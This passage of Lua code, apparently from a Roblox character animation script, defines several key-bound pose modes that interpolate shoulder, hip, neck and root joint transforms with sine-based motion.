			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.7453292519943295, 0, -3.141592653589793 - Vrt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-95,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-100,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end
	})

	addmode("q", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.75, -0.2) * angles(2.705260340591211 - 0.08726646259971647 * sin((sine + 0.1) * 2), -2.792526803190927, -0.6981317007977318), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.75, -0.2) * angles(2.705260340591211 - 0.08726646259971647 * sin((sine + 0.1) * 2), 2.792526803190927, 0.6981317007977318), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.9198621771937625 - 0.10471975511965978 * sin((sine + 0.3) * 2), 0, 3.141592653589793), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, -2.45 - 0.05 * sin(sine * 2), Cfw * -3) * angles(0.03490658503988659 * sin(sine * 2) - Cfw, Crt, 3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.3962634015954636 - 0.03490658503988659 * sin(sine * 2), 1.3089969389957472, -0.9599310885968813), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.03490658503988659 * sin(sine * 2), -1.3089969389957472, 1.5707963267948966), deltaTime) 
			--LeftArm,-1,0,0,2,155,-5,0.1,2,0.75,0,0,2,-160,0,0,2,-0.2,0,0,2,-40,0,0,2,RightArm,1,0,0,2,155,-5,0.1,2,0.75,0,0,2,160,0,0,2,-0.2,0,0,2,40,0,0,2,Head,0,0,0,2,-110,-6,0.3,2,1,0,0,2,-0,0,0,2,0,0,0,2,180,0,0,2,Torso,0,0,0,2,0,2,0,2,-2.45,-0.05,0,2,-0,0,0,2,0,0,0,2,180,0,0,2,RightLeg,1,0,0,2,80,-2,0,2,-1,0,0,2,75,0,0,2,0,0,0,2,-55,0,0,2,LeftLeg,-1,0,0,2,90,-2,0,2,-1,0,0,2,-75,0,0,2,0,0,0,2,90,0,0,2
		end
	})
	addmode("e", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9, 0.4 + 0.1 * sin(sine * 2), 0.3 - 0.15 * sin(sine * 2)) * angles(-1.0471975511965976 - 0.12217304763960307 * sin(sine * 2), -1.3962634015954636, -0.6981317007977318), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, -1.85 - 0.1 * sin((sine + 0.2) * 2), Cfw * -3) * angles(-1.3962634015954636 + 0.03490658503988659 * sin(sine * 2) - Cfw, -0.08726646259971647 + Crt, 3.141592653589793), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.4 + 0.1 * sin(sine * 2), 0.2 - 0.15 * sin(sine * 2)) * angles(0.6108652381980153 - 0.12217304763960307 * sin(sine * 2), 1.2217304763960306, -0.7853981633974483), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.6580627893946132 - 0.03490658503988659 * sin((sine + 0.6) * 2), 0.10471975511965978 + 0.06981317007977318 * sin(sine * 0.66), 3.141592653589793 + 0.3490658503988659 * sin(sine * 0.66)), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, 0.2 + 0.15 * sin((sine + 0.2) * 2), -0.7 + 0.1 * sin(sine * 2)) * angles(1.4835298641951802 + 0.03490658503988659 * sin(sine * 2), 1.4835298641951802, -1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.75 + 0.1 * sin((sine + 0.2) * 2), -0.5) * angles(1.3962634015954636 - 0.03490658503988659 * sin(sine * 2), -1.6580627893946132, 0), deltaTime) 
			--LeftArm,-0.9,0,0,2,-60,-7,0,2,0.4,0.1,0,2,-80,0,0,2,0.3,-0.15,0,2,-40,0,0,2,Torso,0,0,0,2,-80,2,0,2,-1.85,-0.1,0.2,2,-5,0,0,2,0,0,0,2,180,0,0,2,RightArm,1,0,0,2,35,-7,0,2,0.4,0.1,0,2,70,0,0,2,0.2,-0.15,0,2,-45,0,0,2,Head,0,0,0,2,-95,-2,0.6,2,1,0,0,2,6,4,0,0.66,0,0,0,2,180,20,0,0.66,RightLeg,1,0,0,2,85,2,0,2,0.2,0.15,0.2,2,85,0,0,2,-0.7,0.1,0,2,-90,0,0,2,LeftLeg,-1,0,0,2,80,-2,0,2,-0.75,0.1,0.2,2,-95,0,0,2,-0.5,0,0,2,0,0,0,2
		end
	})
	addmode("r", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.9 - 0.2 * sin(sine * 2), 0) * angles(1.5707963267948966, 1.6580627893946132 - 0.17453292519943295 * sin(sine + 0.8), -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0.3 * sin(sine + 0.8) + Crt * 3, -0.1 + 0.2 * sin(sine * 2), Cfw * -3) * angles(-1.5707963267948966 - Cfw, Crt, -3.141592653589793), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin((sine - 0.5) * 2), 0.08726646259971647 * sin(sine - 1), -3.141592653589793 + 0.2617993877991494 * sin(sine * 5)), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1 + 0.1 * sin(sine * 7), 0.2 - 0.1 * sin(sine + 0.8), -0.25) * angles(1.5707963267948966 + 0.5235987755982988 * sin(sine * 7), -0.6981317007977318, 0.3490658503988659 * sin(sine * 7)), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.9 - 0.2 * sin(sine * 2), 0) * angles(1.5707963267948966, -1.6580627893946132 - 0.17453292519943295 * sin(sine + 0.8), 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1 + 0.1 * sin(sine * 7), 0.2 + 0.1 * sin(sine + 0.8), -0.25) * angles(1.5707963267948966 - 0.5235987755982988 * sin(sine * 7), 0.6981317007977318, 0.3490658503988659 * sin(sine * 7)), deltaTime) 
			--RightLeg,1,0,0,1,90,0,0,1,-0.9,-0.2,0,2,95,-10,0.8,1,0,0,0,1,-90,0,0,1,Torso,0,0.3,0.8,1,-90,0,0,1,-0.1,0.2,0,2,0,0,0,1,0,0,0,1,-180,0,0,1,Head,0,0,0,1,-90,5,-0.5,2,1,0,0,1,0,5,-1,1,0,0,0,1,-180,15,0,5,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,LeftArm,-1,0.1,0,7,90,30,0,7,0.2,-0.1,0.8,1,-40,0,0,1,-0.25,0,0,1,0,20,0,7,LeftLeg,-1,0,0,1,90,0,0,1,-0.9,-0.2,0,2,-95,-10,0.8,1,0,0,0,1,90,0,0,1,RightArm,1,0.1,0,7,90,-30,0,7,0.2,0.1,0.8,1,40,0,0,1,-0.25,0,0,1,-0,20,0,7
		end
	})         
	addmode("t", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()--

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(1.5707963267948966, -1.6580627893946132 + 0.08726646259971647 * sin((sine - 0.3) * 4), 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1 + 0.15 * sin((sine - 0.4) * 4), 1.42, 0) * angles(1.5707963267948966, 1.4835298641951802 - 0.3490658503988659 * sin((sine - 0.4) * 4), 1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.4835298641951802, 0.04363323129985824 - 0.08726646259971647 * sin((sine + 0.1) * 4), -3.141592653589793 + 0.04363323129985824 * sin(sine * 4)), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0.1 * sin(sine * 4) + Crt * 3, 0, Cfw * -3) * angles(-1.5707963267948966 - Cfw, -0.08726646259971647 + 0.08726646259971647 * sin(sine * 4) + Crt, -3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1.1 + 0.1 * sin(sine * 4), 0) * angles(1.5707963267948966, 1.5707963267948966 + 0.08726646259971647 * sin(sine * 4), -1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1 - 0.02 * sin(sine * 4), -0.925 - 0.07 * sin(sine * 4), 0) * angles(1.5707963267948966, -1.7453292519943295 + 0.08726646259971647 * sin(sine * 4), 1.5707963267948966), deltaTime) 
			--LeftArm,-1,0,0,4,90,0,0,4,0.5,0,0,4,-95,5,-0.3,4,0,0,0,4,90,0,0,4,RightArm,1,0.15,-0.4,4,90,0,0,4,1.42,0,0,4,85,-20,-0.4,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-85,0,0,4,1,0,0,4,2.5,-5,0.1,4,0,0,0,4,-180,2.5,0,4,Torso,0,0.1,0,4,-90,0,0,4,0,0,0,4,-5,5,0,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,0,0,4,-1.1,0.1,0,4,90,5,0,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,-0.02,0,4,90,0,0,4,-0.925,-0.07,0,4,-100,5,0,4,0,0,0,4,90,0,0,4
		end
	})
	addmode("y", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5, 0.5, 0) * angles(-1.7453292519943295, 0.17453292519943295 - 0.04363323129985824 * sin(sine * 2), -1.4835298641951802), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.9000000953674316 - 0.1 * sin(sine * 2), 0) * angles(-1.3962634015954636, 1.3962634015954636, 1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1.0000001192092896 - 0.1 * sin(sine * 2), 0) * angles(-1.5707963267948966, -1.3962634015954636, -1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-2.0943951023931953 + 0.08726646259971647 * sin((sine - 1) * 2), -0.08726646259971647, 2.792526803190927), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 1.2000000476837158, 0) * angles(2.6179938779914944 + 0.08726646259971647 * sin((sine - 1) * 2), 0.6981317007977318, -1.3962634015954636), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0.1 * sin(sine * 2), Cfw * -3) * angles(-1.6580627893946132 - Cfw, 0.08726646259971647 + Crt, 3.0543261909900767), deltaTime) 
			--LeftArm,-1.5,0,0,2,-100,0,0,2,0.5,0,0,2,10,-2.5,0,2,0,0,0,2,-85,0,0,2,RightLeg,1,0,0,2,-80,0,0,2,-0.9000000953674316,-0.1,0,2,80,0,0,2,0,0,0,2,90,0,0,2,LeftLeg,-1,0,0,2,-90,0,0,2,-1.0000001192092896,-0.1,0,2,-80,0,0,2,0,0,0,2,-90,0,0,2,Fedora_Handle,8.657480066176504e-09,0,0,2,-6,0,0,2,-0.15052366256713867,0,0,2,0,0,0,2,-0.010221302509307861,0,0,2,0,0,0,2,Head,0,0,0,2,-120,5,-1,2,1,0,0,2,-5,0,0,2,0,0,0,2,160,0,0,2,RightArm,1,0,0,2,150,5,-1,2,1.2000000476837158,0,0,2,40,0,0,2,0,0,0,2,-80,0,0,2,Torso,0,0,0,2,-95,0,0,2,0,0.1,0,2,5,0,0,2,0,0,0,2,175,0,0,2
		end
	})        
	addmode("u", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0.75 + 0.25 * sin(sine * 2), Cfw * -3) * angles(-1.5707963267948966 - Cfw, Crt, 3.141592653589793), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1.5 - 0.1 * sin((sine + 0.2) * 2), 0) * angles(-1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.4) * 2), 0, 3.141592653589793 + 0.3490658503988659 * sin(sine * 0.66)), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-0.5 - 1 * sin((sine + 0.2) * 2.2), -0.75 - 0.25 * sin(sine * 2), 1 * sin((sine + 0.95) * 2.2)) * angles(0, -1.5707963267948966, 0), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(0.5 + 1 * sin((sine + 0.2) * 2.2), -0.75 - 0.25 * sin(sine * 2), -1 * sin((sine + 0.95) * 2.2)) * angles(0, 1.5707963267948966, 0), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(-0.5 - 1.85 * sin(sine * 2), 0.8 - 0.5 * sin(sine * 2), -1.85 * sin((sine + 0.75) * 2)) * angles(0, 1.5707963267948966, 0), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(0.5 + 1.85 * sin(sine * 2), 0.8 - 0.5 * sin(sine * 2), 1.85 * sin((sine + 0.75) * 2)) * angles(0, -1.5707963267948966, 0), deltaTime) 
			--Torso,0,0,0,2,-90,0,0,2,0.75,0.25,0,2,-0,0,0,2,0,0,0,2,180,0,0,2,Fedora_Handle,8.657480066176504e-09,0,0,2,-6,0,0,2,-0.15052366256713867,0,0,2,0,0,0,2,-0.010221302509307861,0,0,2,0,0,0,2,Head,0,0,0,2,-90,-5,0.4,2,1.5,-0.1,0.2,2,-0,0,0,2,0,0,0,2,180,20,0,0.66,LeftLeg,-0.5,-1,0.2,2.2,-0,0,0,2,-0.75,-0.25,0,2,-90,0,0,2,0,1,0.95,2.2,0,0,0,2,RightLeg,0.5,1,0.2,2.2,0,0,0,2,-0.75,-0.25,0,2,90,0,0,2,0,-1,0.95,2.2,0,0,0,2,RightArm,-0.5,-1.85,0,2,0,0,0,2,0.8,-0.5,0,2,90,0,0,2,0,-1.85,0.75,2,0,0,0,2,LeftArm,0.5,1.85,0,2,-0,0,0,2,0.8,-0.5,0,2,-90,0,0,2,0,1.85,0.75,2,0,0,0,2
		end
	})
	addmode("i", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.5, 0.5 + 0.1 * sin((sine - 0.4444444444444444) * 9), 0) * angles(2.9670597283903604 + 0.17453292519943295 * sin((sine - 0.17777777777777778) * 9), -0.5235987755982988, 1.5707963267948966 + 0.17453292519943295 * sin(sine * 4.5)), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.5 + 0.1 * sin((sine + 0.26666666666666666) * 4.5), -0.5) * angles(1.7453292519943295 - 1.0471975511965976 * sin(sine * 4.5), -1.5707963267948966 + 0.03490658503988659 * sin(sine * 4.5), 1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, -0.5 + 0.5 * sin((sine + 0.17777777777777778) * 9), Cfw * -3) * angles(-1.3962634015954636 - 0.03490658503988659 * sin((sine + 0.17777777777777778) * 9) - Cfw, -0.05235987755982989 * sin(sine * 4.5) + Crt, 3.141592653589793 + 0.03490658503988659 * sin(sine * 4.5)), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1 + 0.2 * sin(sine * 9), 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin(sine * 9), 0.08726646259971647 * sin(sine * 4.5), 3.141592653589793 - 0.06981317007977318 * sin(sine * 4.5)), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.5, 0.5 + 0.1 * sin((sine - 0.4444444444444444) * 9), 0) * angles(2.9670597283903604 + 0.17453292519943295 * sin((sine - 0.17777777777777778) * 9), 0.5235987755982988, -1.5707963267948966 + 0.17453292519943295 * sin(sine * 4.5)), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.5 + 0.1 * sin((sine - 0.26666666666666666) * 4.5), -0.5) * angles(1.7453292519943295 + 1.0471975511965976 * sin(sine * 4.5), 1.5707963267948966 + 0.03490658503988659 * sin(sine * 4.5), -1.5707963267948966), deltaTime) 
			--LeftArm,-0.5,0,0,4.5,170,10,-0.17777777777777778,9,0.5,0.1,-0.4444444444444444,9,-30,0,0,4.5,0,0,0,4.5,90,10,0,4.5,LeftLeg,-1,0,0,4.5,100,-60,0,4.5,-0.5,0.1,0.26666666666666666,4.5,-90,2,0,4.5,-0.5,0,0,4.5,90,0,0,4.5,Torso,0,0,0,4.5,-80,-2,0.17777777777777778,9,-0.5,0.5,0.17777777777777778,9,-0,-3,0,4.5,0,0,0,4.5,180,2,0,4.5,Head,0,0,0,4.5,-90,5,0,9,1,0.2,0,9,-0,5,0,4.5,0,0,0,4.5,180,-4,0,4.5,RightArm,0.5,0,0,4.5,170,10,-0.17777777777777778,9,0.5,0.1,-0.4444444444444444,9,30,0,0,4.5,0,0,0,4.5,-90,10,0,4.5,RightLeg,1,0,0,4.5,100,60,0,4.5,-0.5,0.1,-0.26666666666666666,4.5,90,2,0,4.5,-0.5,0,0,4.5,-90,0,0,4.5
		end,
	})
	addmode("o", {
		idle = function()
			local rY, lY = raycastlegs()

			local Cfw, Crt = velchgbycfrvec()

			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 + lY, lY * -0.5) * angles(-1.8325957145940461 - 0.08726646259971647 * sin(sine * 2), -1.4835298641951802, -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt, 0, 0.09 * sin(sine * 2) - Cfw * 3) * angles(-1.3962634015954636 + 0.08726646259971647 * sin(sine * 2) - Cfw, -0.08726646259971647 + Crt, 3.141592653589793), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(2.9670597283903604 + 0.08726646259971647 * sin(sine * 1), -1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.6) * 1), 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1.1 + rY, rY * -0.5) * angles(-1.7453292519943295 - 0.08726646259971647 * sin(sine * 2), 1.5707963267948966, 1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.2217304763960306 - 0.08726646259971647 * sin((sine + 0.3) * 2), -0.2617993877991494 - 0.08726646259971647 * sin(sine * 2), 3.141592653589793), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(2.8797932657906435 + 0.08726646259971647 * sin(sine * 1), 1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.6) * 1), -1.5707963267948966), deltaTime) 
			--LeftLeg,-1,0,0,2,-105,-5,0,2,-1,0,0,2,-85,0,0,2,0,0,0,2,-90,0,0.75,2,Torso,0,0,0,2,-80,5,0,2,0,0,0,2,-5,0,0,2,0,0.09,0,2,180,0,0,2,LeftArm,-1,0,0,2,170,5,0,1,0.5,0,0,2,-90,5,0.6,1,0,0,0,2,90,0,0,2,RightLeg,1,0,0,2,-100,-5,0,2,-1.1,0,0,2,90,0,0,2,0,0,0,2,90,0,0.75,2,Head,0,0,0,2,-70,-5,0.3,2,1,0,0,2,-15,-5,0,2,0,0,0,2,180,0,0,2,RightArm,1,0,0,2,165,5,0,1,0.5,0,0,2,90,-5,0.6,1,0,0,0,2,-90,0,0,2
		end,
		walk = function()
			local Vfw, Vrt = velbycfrvec()

			local rY, lY = raycastlegs()

			local Cfw, Crt = velchgbycfrvec()

			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.04363323129985824 * sin(sine * 16), 0, 3.141592653589793 + 0.08726646259971647 * sin(sine * 8) - Vrt), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 - 0.3 * sin((sine + 0.15) * 8) + rY, rY * -0.5) * angles(-1.5707963267948966 - 0.6981317007977318 * sin(sine * 8) * Vfw, 1.5707963267948966 + 0.6981317007977318 * sin(sine * 8) * Vrt, 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(0.08726646259971647 * sin((sine - 0.05) * 16), 1.5707963267948966 + 0.08726646259971647 * sin(sine * 8) - Vrt/3, 1.5707963267948966), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(0.08726646259971647 * sin((sine - 0.05) * 16), -1.5707963267948966 + 0.08726646259971647 * sin(sine * 8) - Vrt/3, -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0.1 * sin((sine + 0.1) * 16), Cfw * -3) * angles(-1.5707963267948966 - Cfw, Crt, 3.141592653589793 - 0.08726646259971647 * sin(sine * 8)), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 + 0.3 * sin((sine + 0.15) * 8) + lY, lY * -0.5) * angles(1.5707963267948966 + 0.6981317007977318 * sin(sine * 8) * Vfw, -1.5707963267948966 + 0.6981317007977318 * sin(sine * 8) * Vrt, 1.5707963267948966), deltaTime) 
			--Head,0,0,0,8,-90,2.5,0,16,1,0,0,8,-0,0,0,8,0,0,0,8,180,5,0,8,RightLeg,1,0,0,8,-90,-40,0,8,-1,-0.3,0.15,8,90,40,0,8,0,0,0,8,90,0,0,8,RightArm,1,0,0,8,0,5,-0.05,16,0.5,0,0,8,90,5,0,8,0,0,0,8,90,0,0,8,LeftArm,-1,0,0,8,0,5,-0.05,16,0.5,0,0,8,-90,5,0,8,0,0,0,8,-90,0,0,8,Torso,0,0,0,8,-90,0,0,8,0,0.1,0.1,16,-0,0,0,8,0,0,0,8,180,-5,0,8,LeftLeg,-1,0,0,8,90,40,0,8,-1,0.3,0.15,8,-90,40,0,8,0,0,0,8,90,0,0,8
		end
	})
	addmode("p", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1.5, 0.5, 0) * angles(1.5707963267948966, 3.141592653589793, -1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(0, 1.5707963267948966, 0), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5, 0.5, 0) * angles(1.5707963267948966, 3.141592653589793, 1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(0, -1.5707963267948966, 0), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966, 0, -3.141592653589793), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0, Cfw * -3) * angles(-1.5707963267948966 - Cfw, Crt, -3.141592653589793), deltaTime) 
			--RightArm,1.5,0,0,1,90,0,0,1,0.5,0,0,1,180,0,0,1,0,0,0,1,-90,0,0,1,RightLeg,1,0,0,1,0,0,0,1,-1,0,0,1,90,0,0,1,0,0,0,1,0,0,0,1,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,LeftArm,-1.5,0,0,1,90,0,0,1,0.5,0,0,1,180,0,0,1,0,0,0,1,90,0,0,1,LeftLeg,-1,0,0,1,-0,0,0,1,-1,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1,Head,0,0,0,1,-90,0,0,1,1,0,0,1,0,0,0,1,0,0,0,1,-180,0,0,1,Torso,0,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,-180,0,0,1
		end
	})
	addmode("f", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(-3.0543261909900767 - 0.17453292519943295 * sin((sine + 1.5) * 1), -1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.6) * 1), -1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(3.141592653589793 - 0.08726646259971647 * sin(sine * 1), 0.3490658503988659 + 0.08726646259971647 * sin((sine + 0.3) * 1), -1.9198621771937625 + 0.08726646259971647 * sin((sine + 1) * 1)), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3089969389957472 - 0.2617993877991494 * sin((sine + 1.2) * 1), 0.08726646259971647 * sin((sine + 0.2) * 0.5), -2.9670597283903604), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 5 - 0.5 * sin((sine - 0.2) * 1), 0.2 * sin((sine - 1.2) * 1) - Cfw * 3) * angles(-0.08726646259971647 + 0.17453292519943295 * sin((sine + 1.2) * 1) - Cfw, 0.08726646259971647 * sin(sine * 0.5) + Crt, 3.141592653589793), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.3962634015954636 + 0.12217304763960307 * sin((sine + 1.5) * 1), -1.2217304763960306 + 0.08726646259971647 * sin((sine + 0.2) * 0.5), 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.9198621771937625 + 0.12217304763960307 * sin((sine + 1.5) * 1), 1.2217304763960306 + 0.08726646259971647 * sin((sine + 0.2) * 0.5), -1.5707963267948966), deltaTime) 
			--LeftArm,-1,0,0,1,-175,-10,1.5,1,0.5,0,0,1,-90,5,0.6,1,0,0,0,1,-90,0,0,1,RightArm,1,0,0,1,180,-5,0,1,0.5,0,0,1,20,5,0.3,1,0,0,0,1,-110,5,1,1,Head,0,0,0,1,-75,-15,1.2,1,1,0,0,1,-0,5,0.2,0.5,0,0,0,1,-170,0,0,1,Torso,0,0,0,1,-5,10,1.2,1,5,-0.5,-0.2,1,-0,5,0,0.5,0,0.2,-1.2,1,180,0,0,1,LeftLeg,-1,0,0,1,80,7,1.5,1,-1,0,0,1,-70,5,0.2,0.5,0,0,0,1,90,0,0,1,RightLeg,1,0,0,1,110,7,1.5,1,-1,0,0,1,70,5,0.2,0.5,0,0,0,1,-90,0,0,1
		end,
		walk = function()
			local Vfw, Vrt = velbycfrvec()

			local Cfw, Crt = velchgbycfrvec()

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(-3.0543261909900767 - 0.17453292519943295 * sin((sine + 1.5) * 1) - Vfw * 0.1, -1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.6) * 1) + Vrt * 0.2, -1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(3.141592653589793 - 0.08726646259971647 * sin(sine * 1), 0.3490658503988659 + 0.08726646259971647 * sin((sine + 0.3) * 1), -1.9198621771937625 + 0.08726646259971647 * sin((sine + 1) * 1)), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3089969389957472 - 0.2617993877991494 * sin((sine + 1.2) * 1) + Vfw * 0.1, 0.08726646259971647 * sin((sine + 0.2) * 0.5) - Vrt * 0.2, -2.9670597283903604), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 5 - 0.5 * sin((sine - 0.2) * 1), 0.2 * sin((sine - 1.2) * 1) - Cfw * 3) * angles(-0.08726646259971647 + 0.17453292519943295 * sin((sine + 1.2) * 1) - Vfw * 0.2 - Cfw, 0.08726646259971647 * sin(sine * 0.5) + Crt, 3.141592653589793 - Vrt * 0.2), deltaTime) 
